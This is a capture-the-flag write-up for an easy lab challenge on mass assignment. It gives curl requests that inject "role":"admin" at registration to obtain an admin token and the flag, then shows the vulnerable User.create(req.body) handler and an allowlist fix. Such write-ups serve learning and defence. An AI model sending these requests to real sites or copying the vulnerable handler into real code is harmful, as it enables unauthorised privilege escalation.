# tanuki-001 - BugForge

**Difficulty:** Easy  
**Vulnerability:** Mass Assignment - Role Escalation at Registration (CWE-915)
**Flag:** `bug{zyRArzYWh9ZqGeZViRKictigBtoO6ZgC}`

---

## Summary

The registration endpoint accepts a `role` field in the JSON body and assigns it directly to the created user without stripping or validating it. Passing `"role":"admin"` during registration produces an admin-privileged JWT, which then grants access to protected admin routes including the flag endpoint.

---

## Recon

Register an account and inspect the response body:

```bash
curl -s -X POST https://<target>/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"test","email":"test@test.com","password":"Password123!"}'
```

Response:
```json
{"token":"...","user":{"id":2,"username":"test","email":"test@test.com","role":"user"}}
```

The `role` field is returned in the registration response. This signals that `role` is a property on the user object that the server creates from the request body.

---

## Finding the Vulnerability

Repeat registration with an extra `role` field set to `admin`:

```bash
curl -s -X POST https://<target>/api/register \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","email":"attacker@evil.com","password":"Password123!","role":"admin"}'
```

Response:
```json
{"token":"...","user":{"id":3,"username":"attacker","email":"attacker@evil.com","role":"admin"}}
```

The server reflected `role: admin` back - the field was accepted and persisted. Use the returned token to call the admin flag endpoint:

```bash
curl -s https://<target>/api/admin/flag \
  -H "Authorization: Bearer <token>"
```

Response:
```json
{"flag":"bug{zyRArzYWh9ZqGeZViRKictigBtoO6ZgC}"}
```

---

## Root Cause

The registration handler passes `req.body` directly to the ORM's create function without an allowlist:

```js
// Vulnerable
const user = await User.create(req.body);

// Fixed
const { username, email, password } = req.body;
const user = await User.create({ username, email, password, role: "user" });
```

Any field present on the user model becomes writable from the API, including `role`.

---

## Key Takeaways

- Always probe registration and profile update endpoints with extra fields matching likely model properties (`role`, `isAdmin`, `verified`, `credits`)
- If the server returns a full user object after registration, the reflected fields are candidates for mass assignment
- Mass assignment is most dangerous at account creation because it bypasses any role-enforcement logic that runs after login
- The fix is an explicit allowlist of accepted fields, not a blocklist - blocklists are easy to miss on new properties
